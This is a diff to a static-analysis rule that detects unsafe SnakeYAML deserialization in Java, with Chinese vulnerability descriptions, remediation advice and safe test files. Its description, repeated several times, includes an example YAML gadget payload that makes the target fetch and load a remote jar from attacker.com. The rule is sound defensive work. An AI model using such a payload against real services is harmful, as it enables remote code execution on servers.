@@ -7,39 +7,30 @@ https://javadoc.io/doc/org.yaml/snakeyaml/latest/org/yaml/snakeyaml/Yaml.html
 REFERENCE
 	desc: <<<DESC
 ### 漏洞描述
-
 1. **漏洞原理**
-   反序列化漏洞允许攻击者通过发送恶意构造的序列化对象，在应用程序反序列化时触发非预期的对象行为，包括但不限于执行任意代码。当Java应用程序使用`SnakeYAML`库的`load()`、`loadAll()`或`loadAs()`等方法从不受信任的来源（如用户提交的YAML数据）反序列化对象时，如果未进行适当的安全限制（如使用安全的构造器`SafeConstructor`或禁用不安全的类加载），攻击者可以精心构造一个恶意的YAML输入，其中包含会触发危险操作（如执行命令）的类或方法。攻击者利用此漏洞可以绕过应用逻辑，在服务器上执行任意系统命令，导致敏感数据泄露、服务器被完全控制等严重后果。
-
+反序列化漏洞允许攻击者通过发送恶意构造的序列化对象，在应用程序反序列化时触发非预期的对象行为，包括但不限于执行任意代码。当Java应用程序使用`SnakeYAML`库的`load()`、`loadAll()`或`loadAs()`等方法从不受信任的来源（如用户提交的YAML数据）反序列化对象时，如果未进行适当的安全限制（如使用安全的构造器`SafeConstructor`或禁用不安全的类加载），攻击者可以精心构造一个恶意的YAML输入，其中包含会触发危险操作（如执行命令）的类或方法。攻击者利用此漏洞可以绕过应用逻辑，在服务器上执行任意系统命令，导致敏感数据泄露、服务器被完全控制等严重后果。
 2. **触发场景**
-   当应用程序直接反序列化用户可控或来自不可信源的YAML数据时，例如：
-   
-   ```java
-   import org.yaml.snakeyaml.Yaml;
-   // ...
-   String userSuppliedYaml = receiveInput(); // 接收用户输入
-   Yaml y = new Yaml();
-   y.load(userSuppliedYaml); // 直接加载用户输入的YAML，存在风险
-   ```
-   
-   攻击者可以构造包含执行命令的payload，例如：
-   
-   ```yaml
-   !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/evil.jar"]]]]
-   ```
-   
-   或者利用其他Gadgets链来触发命令执行。
-
+当应用程序直接反序列化用户可控或来自不可信源的YAML数据时，例如：
+```java
+import org.yaml.snakeyaml.Yaml;
+// ...
+String userSuppliedYaml = receiveInput(); // 接收用户输入
+Yaml y = new Yaml();
+y.load(userSuppliedYaml); // 直接加载用户输入的YAML，存在风险
+```
+攻击者可以构造包含执行命令的payload，例如：
+```yaml
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/evil.jar"]]]]
+```
+或者利用其他Gadgets链来触发命令执行。
 3. **潜在影响**
-   - 服务器上执行任意代码，直接控制服务器。
-   - 读取、修改或删除服务器上的任意文件。
-   - 数据泄露，包括敏感配置信息、密钥或用户数据。
-   - 拒绝服务攻击，消耗服务器资源。
-   - 绕过身份验证和授权机制。
-
+- 服务器上执行任意代码，直接控制服务器。
+- 读取、修改或删除服务器上的任意文件。
+- 数据泄露，包括敏感配置信息、密钥或用户数据。
+- 拒绝服务攻击，消耗服务器资源。
+- 绕过身份验证和授权机制。
 规则审计的类:
 - org.yaml.snakeyaml.Yaml
-
 审计的方法:
 - load()
 - loadAll()
@@ -48,10 +39,8 @@ DESC
 	rule_id: "1a99e8b1-3911-447c-8f92-d13eee1afa70"
 	solution: <<<SOLUTION
 ### 修复建议
-
 #### 1. 使用安全的构造器（SafeConstructor）
 始终使用`SafeConstructor`来反序列化YAML数据。`SafeConstructor`限制了可被实例化的类，仅允许Java的基本数据类型、列表和映射等安全类型，阻止反序列化危险对象。
-
 ```java
 // 修复代码示例
 import org.yaml.snakeyaml.Yaml;
@@ -61,13 +50,10 @@ String userSuppliedYaml = receiveInput();
 Yaml y = new Yaml(new SafeConstructor()); // 使用 SafeConstructor
 y.load(userSuppliedYaml);
 ```
-
 #### 2. 限制反序列化的类
 如果需要反序列化特定类型的对象，可以限制允许反序列化的类列表，阻止反序列化其他潜在危险的类。SnakeYAML提供了相关配置选项，但使用`SafeConstructor`是更简单且通常更安全的默认选项。
-
 #### 3. 对输入进行验证和过滤
 对来自不可信源的YAML数据进行严格的格式和内容验证。虽然这不能完全替代安全的构造器，但可以作为附加的安全层级。避免直接读取和反序列化任意结构的YAML数据。
-
 #### 4. 升级SnakeYAML库
 确保使用的SnakeYAML库版本是最新的，以包含已知的反序列化漏洞修复。
 SOLUTION
@@ -90,12 +76,10 @@ $sink #{
 alert $high for {
 	title: "Check Java SnakeYAML Unserialization Vulnerability",
 	title_zh: "检测Java SnakeYAML反序列化漏洞",
-	solution: <<<CODE
+	solution: <<<SOLUTION
 ### 修复建议
-
 #### 1. 使用安全的构造器（SafeConstructor）
 始终使用`SafeConstructor`来反序列化YAML数据。`SafeConstructor`限制了可被实例化的类，仅允许Java的基本数据类型、列表和映射等安全类型，阻止反序列化危险对象。
-
 ```java
 // 修复代码示例
 import org.yaml.snakeyaml.Yaml;
@@ -105,58 +89,48 @@ String userSuppliedYaml = receiveInput();
 Yaml y = new Yaml(new SafeConstructor()); // 使用 SafeConstructor
 y.load(userSuppliedYaml);
 ```
-
 #### 2. 限制反序列化的类
 如果需要反序列化特定类型的对象，可以限制允许反序列化的类列表，阻止反序列化其他潜在危险的类。SnakeYAML提供了相关配置选项，但使用`SafeConstructor`是更简单且通常更安全的默认选项。
-
 #### 3. 对输入进行验证和过滤
 对来自不可信源的YAML数据进行严格的格式和内容验证。虽然这不能完全替代安全的构造器，但可以作为附加的安全层级。避免直接读取和反序列化任意结构的YAML数据。
-
 #### 4. 升级SnakeYAML库
 确保使用的SnakeYAML库版本是最新的，以包含已知的反序列化漏洞修复。
-CODE
-	desc: <<<CODE
+SOLUTION
+	desc: <<<DESC
 ### 漏洞描述
-
 1. **漏洞原理**
-   反序列化漏洞允许攻击者通过发送恶意构造的序列化对象，在应用程序反序列化时触发非预期的对象行为，包括但不限于执行任意代码。当Java应用程序使用`SnakeYAML`库的`load()`、`loadAll()`或`loadAs()`等方法从不受信任的来源（如用户提交的YAML数据）反序列化对象时，如果未进行适当的安全限制（如使用安全的构造器`SafeConstructor`或禁用不安全的类加载），攻击者可以精心构造一个恶意的YAML输入，其中包含会触发危险操作（如执行命令）的类或方法。攻击者利用此漏洞可以绕过应用逻辑，在服务器上执行任意系统命令，导致敏感数据泄露、服务器被完全控制等严重后果。
-
+反序列化漏洞允许攻击者通过发送恶意构造的序列化对象，在应用程序反序列化时触发非预期的对象行为，包括但不限于执行任意代码。当Java应用程序使用`SnakeYAML`库的`load()`、`loadAll()`或`loadAs()`等方法从不受信任的来源（如用户提交的YAML数据）反序列化对象时，如果未进行适当的安全限制（如使用安全的构造器`SafeConstructor`或禁用不安全的类加载），攻击者可以精心构造一个恶意的YAML输入，其中包含会触发危险操作（如执行命令）的类或方法。攻击者利用此漏洞可以绕过应用逻辑，在服务器上执行任意系统命令，导致敏感数据泄露、服务器被完全控制等严重后果。
 2. **触发场景**
-   当应用程序直接反序列化用户可控或来自不可信源的YAML数据时，例如：
-   
-   ```java
-   import org.yaml.snakeyaml.Yaml;
-   // ...
-   String userSuppliedYaml = receiveInput(); // 接收用户输入
-   Yaml y = new Yaml();
-   y.load(userSuppliedYaml); // 直接加载用户输入的YAML，存在风险
-   ```
-   
-   攻击者可以构造包含执行命令的payload，例如：
-   
-   ```yaml
-   !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/evil.jar"]]]]
-   ```
-   
-   或者利用其他Gadgets链来触发命令执行。
-
+当应用程序直接反序列化用户可控或来自不可信源的YAML数据时，例如：
+```java
+import org.yaml.snakeyaml.Yaml;
+// ...
+String userSuppliedYaml = receiveInput(); // 接收用户输入
+Yaml y = new Yaml();
+y.load(userSuppliedYaml); // 直接加载用户输入的YAML，存在风险
+```
+攻击者可以构造包含执行命令的payload，例如：
+```yaml
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/evil.jar"]]]]
+```
+或者利用其他Gadgets链来触发命令执行。
 3. **潜在影响**
-   - 服务器上执行任意代码，直接控制服务器。
-   - 读取、修改或删除服务器上的任意文件。
-   - 数据泄露，包括敏感配置信息、密钥或用户数据。
-   - 拒绝服务攻击，消耗服务器资源。
-   - 绕过身份验证和授权机制。
-
+- 服务器上执行任意代码，直接控制服务器。
+- 读取、修改或删除服务器上的任意文件。
+- 数据泄露，包括敏感配置信息、密钥或用户数据。
+- 拒绝服务攻击，消耗服务器资源。
+- 绕过身份验证和授权机制。
 规则审计的类:
 - org.yaml.snakeyaml.Yaml
-
 审计的方法:
 - load()
 - loadAll()
 - loadAs()
-CODE
+DESC
 	level: "high",
 	message: "发现Java SnakeYAML反序列化漏洞,并且没有任何数据流过滤。",
+	name: "high",
+	risk: "反序列化漏洞",
 }
 
 $sink #{
@@ -165,50 +139,43 @@ $sink #{
 
 $result - $high as $low;
 alert $low for {
-	desc: <<<CODE
+	desc: <<<DESC
 ### 漏洞描述
-
 1. **漏洞原理**
-   反序列化漏洞允许攻击者通过发送恶意构造的序列化对象，在应用程序反序列化时触发非预期的对象行为，包括但不限于执行任意代码。当Java应用程序使用`SnakeYAML`库的`load()`、`loadAll()`或`loadAs()`等方法从不受信任的来源（如用户提交的YAML数据）反序列化对象时，如果未进行适当的安全限制（如使用安全的构造器`SafeConstructor`或禁用不安全的类加载），攻击者可以精心构造一个恶意的YAML输入，其中包含会触发危险操作（如执行命令）的类或方法。攻击者利用此漏洞可以绕过应用逻辑，在服务器上执行任意系统命令，导致敏感数据泄露、服务器被完全控制等严重后果。
-
+反序列化漏洞允许攻击者通过发送恶意构造的序列化对象，在应用程序反序列化时触发非预期的对象行为，包括但不限于执行任意代码。当Java应用程序使用`SnakeYAML`库的`load()`、`loadAll()`或`loadAs()`等方法从不受信任的来源（如用户提交的YAML数据）反序列化对象时，如果未进行适当的安全限制（如使用安全的构造器`SafeConstructor`或禁用不安全的类加载），攻击者可以精心构造一个恶意的YAML输入，其中包含会触发危险操作（如执行命令）的类或方法。攻击者利用此漏洞可以绕过应用逻辑，在服务器上执行任意系统命令，导致敏感数据泄露、服务器被完全控制等严重后果。
 2. **触发场景**
-   当应用程序直接反序列化用户可控或来自不可信源的YAML数据时，例如：
-   
-   ```java
-   import org.yaml.snakeyaml.Yaml;
-   // ...
-   String userSuppliedYaml = receiveInput(); // 接收用户输入
-   Yaml y = new Yaml();
-   y.load(userSuppliedYaml); // 直接加载用户输入的YAML，存在风险
-   ```
-   
-   攻击者可以构造包含执行命令的payload，例如：
-   
-   ```yaml
-   !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/evil.jar"]]]]
-   ```
-   
-   或者利用其他Gadgets链来触发命令执行。
-
+当应用程序直接反序列化用户可控或来自不可信源的YAML数据时，例如：
+```java
+import org.yaml.snakeyaml.Yaml;
+// ...
+String userSuppliedYaml = receiveInput(); // 接收用户输入
+Yaml y = new Yaml();
+y.load(userSuppliedYaml); // 直接加载用户输入的YAML，存在风险
+```
+攻击者可以构造包含执行命令的payload，例如：
+```yaml
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/evil.jar"]]]]
+```
+或者利用其他Gadgets链来触发命令执行。
 3. **潜在影响**
-   - 服务器上执行任意代码，直接控制服务器。
-   - 读取、修改或删除服务器上的任意文件。
-   - 数据泄露，包括敏感配置信息、密钥或用户数据。
-   - 拒绝服务攻击，消耗服务器资源。
-   - 绕过身份验证和授权机制。
-
+- 服务器上执行任意代码，直接控制服务器。
+- 读取、修改或删除服务器上的任意文件。
+- 数据泄露，包括敏感配置信息、密钥或用户数据。
+- 拒绝服务攻击，消耗服务器资源。
+- 绕过身份验证和授权机制。
 规则审计的类:
 - org.yaml.snakeyaml.Yaml
-
 审计的方法:
 - load()
 - loadAll()
 - loadAs()
-CODE
+DESC
 	level: "low",
 	message: "发现Java SnakeYAML反序列化漏洞,但是有数据流过滤。",
 	title: "Check Java SnakeYAML Unserialization Vulnerability",
 	title_zh: "检测Java SnakeYAML反序列化漏洞",
+	risk: "反序列化漏洞",
+	name: "low",
 }
 
 desc(
@@ -247,5 +214,66 @@ public class SnakeYamlController {
 
 }
 TEXT
+	"safefile://SafeYamlDeserialization.java": <<<CODE
+// 使用SafeConstructor安全反序列化
+import org.yaml.snakeyaml.Yaml;
+import org.yaml.snakeyaml.constructor.SafeConstructor;
+
+public class SafeYamlDeserialization {
+    public static void main(String[] args) {
+        // 模拟接收到的YAML数据，这里是一个安全的YAML
+        String safeYamlData = "name: John Doe\nage: 30";
+
+        // 使用SafeConstructor，只允许反序列化基本的Java类型
+        // 推荐的做法是总是使用SafeConstructor来处理不可信来源的YAML数据
+        Yaml yaml = new Yaml(new SafeConstructor());
+        Object data = yaml.load(safeYamlData);
+
+        System.out.println("Safely loaded YAML data: " + data);
+    }
+
+    // 模拟一个从外部接收输入的方法
+    public String receiveInput() {
+        return "dummy_input";
+    }
+}
+CODE
+	"safefile://StrictClassLoadingYaml.java": <<<CODE
+// 限制可反序列化的类
+import org.yaml.snakeyaml.Yaml;
+import org.yaml.snakeyaml.constructor.Constructor;
+import org.yaml.snakeyaml.TypeDescription;
+
+public class StrictClassLoadingYaml {
+
+    public static class User {
+        public String name;
+        public int age;
+    }
+
+    public static void main(String[] args) {
+        String userYaml = "!!StrictClassLoadingYaml$User {name: Alice, age: 25}";
+        
+        // 创建一个构造器，并显式为允许加载的类型注册TypeDescription
+        Constructor constructor = new Constructor(User.class);
+        TypeDescription userDescription = new TypeDescription(User.class);
+        // 可以设置更细粒度的属性限制，例如只允许反序列化特定字段
+        constructor.addTypeDescription(userDescription);
+
+        Yaml yaml = new Yaml(constructor);
+        User user = yaml.load(userYaml);
+
+        System.out.println("User: " + user.name + ", Age: " + user.age);
+
+        // 尝试加载一个未注册的或恶意的类，此时会抛出异常
+        try {
+            String maliciousYaml = "!!java.net.URL {protocol: http}"; // 恶意类
+            yaml.load(maliciousYaml);
+        } catch (Exception e) {
+            System.out.println("Successfully blocked malicious class deserialization: " + e.getMessage());
+        }
+    }
+}
+CODE
 )
 
